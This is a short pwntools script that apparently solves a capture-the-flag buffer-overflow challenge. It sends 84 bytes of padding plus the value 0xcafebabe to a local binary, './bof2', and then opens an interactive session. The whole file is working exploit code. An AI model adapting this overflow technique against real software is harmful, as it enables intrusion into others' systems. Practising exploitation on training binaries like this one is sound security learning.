#!/usr/bin/env python3

from pwn import *

io = process('./bof2')
payload = b'A'*84
payload += p32(0xcafebabe)

io.recv()
io.sendline(payload)
io.interactive()
